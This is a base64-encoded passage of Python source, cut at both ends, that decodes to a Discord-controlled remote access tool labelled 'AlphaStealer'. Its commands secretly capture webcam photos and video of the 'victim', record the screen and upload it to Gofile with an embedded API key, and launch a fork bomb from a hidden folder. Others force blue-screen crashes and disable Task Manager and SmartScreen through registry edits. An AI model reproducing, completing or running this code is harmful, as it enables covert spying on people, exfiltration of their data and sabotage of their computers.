ub3coKQ0KICAgICAgICAgICAgZmVjaGEgPSBub3cuc3RyZnRpbWUoIiVZLSVtLSVkIikNCiAgICAgICAgICAgIGhvcmEgPSBub3cuc3RyZnRpbWUoIiVIOiVNOiVTIikNCg0KICAgICAgICAgICAgZW1iZWRXID0gZGlzY29yZC5FbWJlZCgNCiAgICAgICAgICAgICAgICB0aXRsZT0nUGhvdG8gU3VjY2VzcycsDQogICAgICAgICAgICAgICAgZGVzY3JpcHRpb249ZidGZWNoYTogYHtmZWNoYX1gXG5Ib3JhOiBge2hvcmF9YCcsDQogICAgICAgICAgICAgICAgY29sb3I9MHhGRjAwMDANCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIGVtYmVkVy5zZXRfaW1hZ2UodXJsPSJhdHRhY2htZW50Oi8vcGhvdG8uanBnIikNCiAgICAgICAgICAgIGVtYmVkVy5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KDQogICAgICAgICAgICBpZiB3ZWJjYW1fY2hhbm5lbDoNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGF3YWl0IHdlYmNhbV9jaGFubmVsLnNlbmQoZW1iZWQ9ZW1iZWRXLCBmaWxlPXBpY3R1cmUpDQogICAgICAgICAgICAgICAgZXhjZXB0IGRpc2NvcmQuZXJyb3JzLkhUVFBFeGNlcHRpb246DQogICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICBhd2FpdCBkZWxldGVfcGhvdG9jYW0oZmlsZW5hbWUpDQoNCiAgICBlbHNlOg0KICAgICAgICBjYW0ucmVsZWFzZSgpDQoNCmFzeW5jIGRlZiBkZWxldGVfcGhvdG9jYW0oZmlsZW5hbWUpOg0KICAgIHRyeToNCiAgICAgICAgYXdhaXQgYXN5bmNpby5zbGVlcCgxKQ0KICAgICAgICBvcy5yZW1vdmUoZmlsZW5hbWUpDQogICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoNCiAgICAgICAgcGFzcw0KDQphc3luYyBkZWYgcHJvY2Vzc192aWRlb2NhbShjdHgpOg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1JlY29yZGluZyB2aWRlbyB3aXRoIHRoZSB2aWN0aW0gd2ViY2FtIGZvciAxNSBzZWNvbmRzLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQoNCiAgICB0cnk6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBkaXNjb3JkLmVycm9ycy5IVFRQRXhjZXB0aW9uOg0KICAgICAgICBwYXNzDQoNCiAgICBpZiBjdHguYXV0aG9yLmlkIG5vdCBpbiB1c2VyX2NhbWVyYXM6DQogICAgICAgIHJldHVybg0KDQogICAgY2FtX2luZGV4ID0gdXNlcl9jYW1lcmFzW2N0eC5hdXRob3IuaWRdDQogICAgY2FtID0gY3YyLlZpZGVvQ2FwdHVyZShjYW1faW5kZXgpDQoNCiAgICBpZiBub3QgY2FtLmlzT3BlbmVkKCk6DQogICAgICAgIHJldHVybg0KDQogICAgZm91cmNjID0gY3YyLlZpZGVvV3JpdGVyX2ZvdXJjYygqJ1hWSUQnKQ0KICAgIGZpbGVuYW1lID0gInZpZGVvLmF2aSINCiAgICBvdXQgPSBjdjIuVmlkZW9Xcml0ZXIoZmlsZW5hbWUsIGZvdXJjYywgMjAuMCwgKDY0MCwgNDgwKSkNCg0KICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQ0KICAgIHdoaWxlIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA8IDE1Og0KICAgICAgICByZXQsIGZyYW1lID0gY2FtLnJlYWQoKQ0KICAgICAgICBpZiByZXQ6DQogICAgICAgICAgICBvdXQud3JpdGUoZnJhbWUpDQoNCiAgICBjYW0ucmVsZWFzZSgpDQogICAgb3V0LnJlbGVhc2UoKQ0KDQogICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAicmIiKSBhcyBmOg0KICAgICAgICB2aWRlbyA9IGRpc2NvcmQuRmlsZShmLCBmaWxlbmFtZT0idmlkZW8uYXZpIikNCg0KICAgICAgICAjIEJ1c2NhIGVsIGNhbmFsICd3ZWJjYW0nIGRlbnRybyBkZSBsYSBjYXRlZ29yw61hDQogICAgICAgIHdlYmNhbV9jaGFubmVsID0gTm9uZQ0KICAgICAgICBmb3IgY2hhbm5lbCBpbiBjdHguY2hhbm5lbC5jYXRlZ29yeS5jaGFubmVsczoNCiAgICAgICAgICAgIGlmIGNoYW5uZWwubmFtZSA9PSAnd2ViY2FtJzoNCiAgICAgICAgICAgICAgICB3ZWJjYW1fY2hhbm5lbCA9IGNoYW5uZWwNCiAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgICAgIGlmIHdlYmNhbV9jaGFubmVsOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGF3YWl0IHdlYmNhbV9jaGFubmVsLnNlbmQoZmlsZT12aWRlbykNCiAgICAgICAgICAgIGV4Y2VwdCBkaXNjb3JkLmVycm9ycy5IVFRQRXhjZXB0aW9uOg0KICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgIGF3YWl0IGRlbGV0ZV9maWxlKGZpbGVuYW1lKQ0KDQphc3luYyBkZWYgZGVsZXRlX2ZpbGUoZmlsZW5hbWUpOg0KICAgIHRyeToNCiAgICAgICAgYXdhaXQgYXN5bmNpby5zbGVlcCgxKQ0KICAgICAgICBvcy5yZW1vdmUoZmlsZW5hbWUpDQogICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoNCiAgICAgICAgcGFzcw0KDQpAYm90LmNvbW1hbmQobmFtZT0nYm9tYicpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIGJvbWIoY3R4KToNCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1TdGFydEJvbWIsIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCmRlZiBTdGFydEJvbWIoKToNCiAgICBvcy5jaGRpcihmJ0M6XFxVc2Vyc1xce3VzZXJuYW1lfScpDQogICAgb3MubWtkaXIoJ0JPTUInKQ0KICAgIG9zLmNoZGlyKCdCT01CJykNCiAgICB3aXRoIG9wZW4oJ2JvbWIuY21kJywgJ3cnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOg0KICAgICAgICBmLndyaXRlKCdAZWNobyBvZmZcblxuc3RhcnQgL0IgYm9tYi5jbWRcbicpDQogICAgDQogICAgb3MuY2hkaXIoJy4uJykNCiAgICBvcy5zeXN0ZW0oJ2F0dHJpYiAraCBCT01CJykNCg0KICAgIHN1YnByb2Nlc3MuUG9wZW4oZidDOlxcVXNlcnNcXHt1c2VybmFtZX1cXEJPTUJcXGJvbWIuY21kJywgY3JlYXRpb25mbGFncz1zdWJwcm9jZXNzLkNSRUFURV9OT19XSU5ET1cpDQoNCkBib3QuY29tbWFuZChuYW1lPSd3ZWInKQ0KYXN5bmMgZGVmIHdlYihjdHgsICosIHVybDogc3RyKToNCiAgICBpZiBub3QgdXJsLnN0YXJ0c3dpdGgoKCdodHRwOi8vJywgJ2h0dHBzOi8vJykpOg0KICAgICAgICB1cmwgPSAnaHR0cHM6Ly8nICsgdXJsDQogICAgdHJ5Og0KICAgICAgICB3ZWJicm93c2VyLm9wZW4odXJsKQ0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYne3VybH0gb3Blbi4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwYXNzDQoNCkBib3QuY29tbWFuZChuYW1lPSd3ZWJjcmFzaCcpDQphc3luYyBkZWYgd2ViY3Jhc2goY3R4LCB1cmw6IHN0ciwgdGltZXM6IGludCk6DQogICAgaWYgbm90IHVybC5zdGFydHN3aXRoKCgnaHR0cDovLycsICdodHRwczovLycpKToNCiAgICAgICAgdXJsID0gJ2h0dHBzOi8vJyArIHVybA0KICAgIHRyeToNCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UodGltZXMpOg0KICAgICAgICAgICAgd2ViYnJvd3Nlci5vcGVuKHVybCkNCiAgICAgICAgDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249Zid7dXJsfSBvcGVuZWQge3RpbWVzfSB0aW1lcy4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwYXNzDQoNCmRlZiBzZXRfdm9sdW1lKHZvbHVtZV9wZXJjZW50KToNCiAgICBkZXZpY2VzID0gQXVkaW9VdGlsaXRpZXMuR2V0U3BlYWtlcnMoKQ0KICAgIGludGVyZmFjZSA9IGRldmljZXMuQWN0aXZhdGUoSUF1ZGlvRW5kcG9pbnRWb2x1bWUuX2lpZF8sIENMU0NUWF9BTEwsIE5vbmUpDQogICAgdm9sdW1lID0gY2FzdChpbnRlcmZhY2UsIFBPSU5URVIoSUF1ZGlvRW5kcG9pbnRWb2x1bWUpKQ0KDQogICAgdm9sdW1lX3JhbmdlID0gdm9sdW1lLkdldFZvbHVtZVJhbmdlKCkNCiAgICBtaW5fdm9sdW1lID0gdm9sdW1lX3JhbmdlWzBdDQogICAgbWF4X3ZvbHVtZSA9IHZvbHVtZV9yYW5nZVsxXQ0KDQogICAgdm9sdW1lX2xldmVsID0gbWluX3ZvbHVtZSArICh2b2x1bWVfcGVyY2VudCAvIDEwMC4wKSAqIChtYXhfdm9sdW1lIC0gbWluX3ZvbHVtZSkNCg0KICAgIHZvbHVtZV9sZXZlbCA9IG1heChtaW5fdm9sdW1lLCBtaW4odm9sdW1lX2xldmVsLCBtYXhfdm9sdW1lKSkNCg0KICAgIHZvbHVtZS5TZXRNYXN0ZXJWb2x1bWVMZXZlbCh2b2x1bWVfbGV2ZWwsIE5vbmUpDQoNCkBib3QuY29tbWFuZChuYW1lPSd2b2x1bWUnKQ0KYXN5bmMgZGVmIHZvbHVtZShjdHgsIHZvbDogaW50KToNCiAgICBpZiB2b2wgPCAwIG9yIHZvbCA+IDEwMDoNCiAgICAgICAgcmV0dXJuDQogICAgc2V0X3ZvbHVtZSh2b2wpDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ0N1cnJlbnQgdm9sdW1lOiBge3ZvbH0lYC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ndm9sdW1lZG93bicpDQphc3luYyBkZWYgdm9sdW1lZG93bihjdHgpOg0KICAgIHNldF92b2x1bWUoMCkNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUaGUgdm9sdW1lIGlzIGF0IG1pbmltdW0uJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyLicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCkBib3QuY29tbWFuZChuYW1lPSd2b2x1bWV1cCcpDQphc3luYyBkZWYgdm9sdW1ldXAoY3R4KToNCiAgICBzZXRfdm9sdW1lKDEwMCkNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnVGhlIHZvbHVtZSBpcyBhdCBtYXhpbXVtLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCkBib3QuY29tbWFuZChuYW1lPSd2b2x1bWVtdXRlJykNCmFzeW5jIGRlZiB2b2x1bWVtdXRlKGN0eCk6DQogICAgZGV2aWNlcyA9IEF1ZGlvVXRpbGl0aWVzLkdldFNwZWFrZXJzKCkNCiAgICBpbnRlcmZhY2UgPSBkZXZpY2VzLkFjdGl2YXRlKA0KICAgICAgICBJQXVkaW9FbmRwb2ludFZvbHVtZS5faWlkXywgQ0xTQ1RYX0FMTCwgTm9uZSkNCiAgICB2b2x1bWUgPSBjYXN0KGludGVyZmFjZSwgUE9JTlRFUihJQXVkaW9FbmRwb2ludFZvbHVtZSkpDQoNCiAgICB2b2x1bWUuU2V0TXV0ZSgxLCBOb25lKQ0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1RoZSB2b2x1bWUgaXMgbXV0ZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3ZvbHVtZXVubXV0ZScpDQphc3luYyBkZWYgdm9sdW1ldW5tdXRlKGN0eCk6DQogICAgZGV2aWNlcyA9IEF1ZGlvVXRpbGl0aWVzLkdldFNwZWFrZXJzKCkNCiAgICBpbnRlcmZhY2UgPSBkZXZpY2VzLkFjdGl2YXRlKA0KICAgICAgICBJQXVkaW9FbmRwb2ludFZvbHVtZS5faWlkXywgQ0xTQ1RYX0FMTCwgTm9uZSkNCiAgICB2b2x1bWUgPSBjYXN0KGludGVyZmFjZSwgUE9JTlRFUihJQXVkaW9FbmRwb2ludFZvbHVtZSkpDQoNCiAgICB2b2x1bWUuU2V0TXV0ZSgwLCBOb25lKQ0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1RoZSB2b2x1bWUgaXMgdW5tdXRlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nYmx1ZXNjcmVlbicpDQphc3luYyBkZWYgYmx1ZXNjcmVlbihjdHgpOg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0JsdWVzY3JlZW4gRG9uZS4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIHAgPSBjdHlwZXMuUE9JTlRFUihjdHlwZXMuY19pbnQpKCkNCiAgICBjdHlwZXMud2luZGxsLm50ZGxsLlJ0bEFkanVzdFByaXZpbGVnZSgxOSwgMSwgMCwgY3R5cGVzLmJ5cmVmKGN0eXBlcy5jX2ludCgpKSkNCiAgICBjdHlwZXMud2luZGxsLm50ZGxsLk50UmFpc2VIYXJkRXJyb3IoMHhDMDAwMDA3QiwgMCwgcCwgcCwgNiwgY3R5cGVzLmJ5cmVmKGN0eXBlcy5jX3VpbnQoKSkpDQoNCmRlZiBFbmFibGVBbGxGZWF0dXJlcygpOg0KICAgIEVuYWJsZVRhc2tNZ3IgPSAncmVnIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJEaXNhYmxlVGFza01nciIgL3QgUkVHX0RXT1JEIC9kIDAgL2YnDQogICAgRW5hYmxlU21hcnRTY3JlZW5NaWNyb3NvZnRTdG9yZSA9ICdyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyIiAvdiAiU21hcnRTY3JlZW5FbmFibGVkIiAvdCBSRUdfU1ogL2QgIldhcm4iIC9mJw0KICAgIEVuYWJsZVNtYXJ0U2NyZWVuTm9ybWFsID0gJ3JlZyBhZGQgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXIiIC92ICJTbWFydFNjcmVlbkVuYWJsZWQiIC90IFJFR19TWiAvZCAiV2FybiIgL2YnDQogICAgc3VicHJvY2Vzcy5Qb3BlbihFbmFibGVUYXNrTWdyLCBzaGVsbD1UcnVlKQ0KDQpkZWYgRGlzYWJsZUFsbEZlYXR1cmVzKCk6DQogICAgRGlzYWJsZVRhc2tNZ3IgPSAncmVnIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC92ICJEaXNhYmxlVGFza01nciIgL3QgUkVHX0RXT1JEIC9kIDEgL2YnDQogICAgRGlzYWJsZVNtYXJ0U2NyZWVuTWljcm9zb2Z0U3RvcmUgPSAncmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlciIgL3YgIlNtYXJ0U2NyZWVuRW5hYmxlZCIgL3QgUkVHX1NaIC9kICJPZmYiIC9mJw0KICAgIERpc2FibGVTbWFydFNjcmVlbk5vcm1hbCA9ICdyZWcgYWRkICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyIiAvdiAiU21hcnRTY3JlZW5FbmFibGVkIiAvdCBSRUdfU1ogL2QgIk9mZiIgL2YnDQogICAgc3VicHJvY2Vzcy5Qb3BlbihEaXNhYmxlVGFza01nciwgc2hlbGw9VHJ1ZSkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2VuYWJsZWFsbCcpDQphc3luYyBkZWYgRW5hYmxlQWxsKGN0eCk6DQogICAgaWYgUHJvdGVjdG9yOg0KICAgICAgICBhd2FpdCBjdHguc2VuZCgn4p2MIEVycm9yOiBQcm90ZWN0b3IgbW9kZSBlbmFibGVkLicpDQogICAgICAgIHJldHVybg0KICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUVuYWJsZUFsbEZlYXR1cmVzLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nQWxsIFdpbmRvd3MgRmVhdHVyZXMgRW5hYmxlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nZGlzYWJsZWFsbCcpDQphc3luYyBkZWYgRGlzYWJsZUFsbChjdHgpOg0KICAgIGlmIFByb3RlY3RvcjoNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoJ+KdjCBFcnJvcjogUHJvdGVjdG9yIG1vZGUgZW5hYmxlZC4nKQ0KICAgICAgICByZXR1cm4NCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1EaXNhYmxlQWxsRmVhdHVyZXMsIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdBbGwgV2luZG93cyBGZWF0dXJlcyBEaXNhYmxlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ndm9pY2UnKQ0KYXN5bmMgZGVmIHZvaWNlKGN0eCwgKiwgdGV4dDogc3RyKToNCiAgICBlbmdpbmUgPSBweXR0c3gzLmluaXQoKQ0KICAgIHJhdGUgPSBlbmdpbmUuZ2V0UHJvcGVydHkoJ3JhdGUnKQ0KICAgIGVuZ2luZS5zZXRQcm9wZXJ0eSgncmF0ZScsIHJhdGUtNTApDQogICAgZW5naW5lLnNldFByb3BlcnR5KCd2b2x1bWUnLCAxKQ0KDQogICAgZW5naW5lLnNheSh0ZXh0KQ0KICAgIGVuZ2luZS5ydW5BbmRXYWl0KCkNCg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0l0IGhhcyBhbHJlYWR5IGJlZW4gc2FpZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpHT0ZJTEVfQVBJX0tFWSA9ICdzSEFqWkxPZHRiMVJJSGlFaXFoMkplMjFvQXZMSVFXNycNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2dyYWJhcnBhbnRhbGxhJykNCmFzeW5jIGRlZiBncmFiYXJwYW50YWxsYShjdHgpOg0KICAgICIiIkdyYWJhIGxhIHBhbnRhbGxhIGR1cmFudGUgMTUgc2VndW5kb3MgeSBsYSBzdWJlIGEgR29maWxlLCBlbnZpYW5kbyBlbCBlbmxhY2UgZGUgZGVzY2FyZ2EiIiINCg0KICAgICMgRW1iZWQgZGUgZXN0YWRvDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nUmVjb3JkaW5nIHZpZGVvLi4uJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICANCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KICAgIGRlZiBncmFiYXJfeV9lbnZpYXIoKToNCiAgICAgICAgIiIiRnVuY2nDs24gcGFyYSBncmFiYXIgeSBzdWJpciBlbCB2aWRlbyBhIEdvZmlsZSIiIg0KICAgICAgICAjIERpbWVuc2lvbmVzIGRlIGxhIHBhbnRhbGxhDQogICAgICAgIHNjcmVlbl93aWR0aCwgc2NyZWVuX2hlaWdodCA9IHB5YXV0b2d1aS5zaXplKCkNCg0KICAgICAgICAjIEVzdGFibGVjZXIgZWwgbm9tYnJlIGRlbCBhcmNoaXZvIGRlIHZpZGVvDQogICAgICAgIHZpZGVvX2ZpbGVuYW1lID0gImdyYWJhY2lvbi5tcDQiDQogICAgICAgIA0KICAgICAgICAjIERlZmluaXIgZWwgY29kZWMgeSBsYSBzYWxpZGEgZGVsIHZpZGVvDQogICAgICAgIGZvdXJjYyA9IGN2Mi5WaWRlb1dyaXRlcl9mb3VyY2MoKidtcDR2JykNCiAgICAgICAgb3V0ID0gY3YyLlZpZGVvV3JpdGVyKHZpZGVvX2ZpbGVuYW1lLCBmb3VyY2MsIDMwLjAsIChzY3JlZW5fd2lkdGgsIHNjcmVlbl9oZWlnaHQpKQ0KDQogICAgICAgICMgVGllbXBvIGRlIGdyYWJhY2nDs24gZW4gc2VndW5kb3MNCiAgICAgICAgdGllbXBvX2dyYWJhY2lvbiA9IDEwDQogICAgICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQ0KDQogICAgICAgICMgR3JhYmFyIGxhIHBhbnRhbGxhIGR1cmFudGUgMTUgc2VndW5kb3MNCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIHNjcmVlbnNob3QgPSBweWF1dG9ndWkuc2NyZWVuc2hvdCgpDQogICAgICAgICAgICBmcmFtZSA9IG5wLmFycmF5KHNjcmVlbnNob3QpDQoNCiAgICAgICAgICAgICMgQ29udmVydGlyIGRlIFJHQiBhIEJHUiAoT3BlbkNWIHVzYSBCR1IpDQogICAgICAgICAgICBmcmFtZSA9IGN2Mi5jdnRDb2xvcihmcmFtZSwgY3YyLkNPTE9SX1JHQjJCR1IpDQoNCiAgICAgICAgICAgICMgRXNjcmliaXIgZWwgZnJhbWUgZW4gZWwgYXJjaGl2byBkZSB2aWRlbw0KICAgICAgICAgICAgb3V0LndyaXRlKGZyYW1lKQ0KDQogICAgICAgICAgICAjIFNhbGlyIHNpIHNlIGFsY2FuesOzIGVsIHRpZW1wbyBkZSBncmFiYWNpw7NuDQogICAgICAgICAgICBpZiB0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUgPj0gdGllbXBvX2dyYWJhY2lvbjoNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICANCiAgICAgICAgIyBMaWJlcmFyIGVsIG9iamV0byBkZSBncmFiYWNpw7NuIGRlIHZpZGVvDQogICAgICAgIG91dC5yZWxlYXNlKCkNCg0KICAgICAgICAjIFZlcmlmaWNhciBzaSBlbCBhcmNoaXZvIGRlIHZpZGVvIGZ1ZSBjcmVhZG8geSBlbnZpYXJsbyBhIEdvZmlsZQ0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh2aWRlb19maWxlbmFtZSk6DQogICAgICAgICAgICAjIFN1YmlyIGVsIHZpZGVvIGEgR29maWxlIHkgb2J0ZW5lciBsYSBVUkwNCiAgICAgICAgICAgIGdvZmlsZV91cmwgPSB1cGxvYWRfdG9fZ29maWxlKHZpZGVvX2ZpbGVuYW1lKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiBnb2ZpbGVfdXJsOg0KICAgICAgICAgICAgICAgICMgRW52aWFyIGxhIFVSTCBkZSBkZXNjYXJnYSBhbCBjYW5hbA0KICAgICAgICAgICAgICAgIGJvdC5sb29wLmNyZWF0ZV90YXNrKGN0eC5zZW5kKGYiVmlkZW8gZ3JhYmFkby4gUHVlZGVzIGRlc2NhcmdhcmxvIGRlc2RlOiB7Z29maWxlX3VybH0iKSkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgYm90Lmxvb3AuY3JlYXRlX3Rhc2soY3R4LnNlbmQoIkh1Ym8gdW4gZXJyb3IgYWwgc3ViaXIgZWwgdmlkZW8gYSBHb2ZpbGUuIikpDQogICAgICAgICAgICANCiAgICAgICAgICAgICMgRWxpbWluYXIgZWwgYXJjaGl2byBkZSB2aWRlbyBsb2NhbCBkZXNwdcOpcyBkZSBlbnZpYXJsbw0KICAgICAgICAgICAgb3MucmVtb3ZlKHZpZGVvX2ZpbGVuYW1lKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgYm90Lmxvb3AuY3JlYXRlX3Rhc2soY3R4LnNlbmQoIkh1Ym8gdW4gZXJyb3IgYWwgY3JlYXIgZWwgdmlkZW8uIikpDQoNCiAgICAjIEVqZWN1dGFyIGxhIGZ1bmNpw7NuIGRlIGdyYWJhY2nDs24geSBlbnbDrW8gZW4gdW4gaGlsbyBzZXBhcmFkbw0KICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdyYWJhcl95X2VudmlhciwgZGFlbW9uPVRydWUpLnN0YXJ0KCkNCg0KZGVmIHVwbG9hZF90b19nb2ZpbGUodmlkZW9fZmlsZW5hbWUpOg0KICAgICIiIkZ1bmNpw7NuIHBhcmEgc3ViaXIgZWwgdmlkZW8gYSBHb2ZpbGUgeSBkZXZvbHZlciBsYSBVUkwgZGUgZGVzY2FyZ2EiIiINCiAgICB0cnk6DQogICAgICAgICMgU29saWNpdGFyIGxhIGNhcmdhIGEgR29maWxlIHVzYW5kbyBzdSBBUEkNCiAgICAgICAgd2l0aCBvcGVuKHZpZGVvX2ZpbGVuYW1lLCAncmInKSBhcyBmaWxlOg0KICAgICAgICAgICA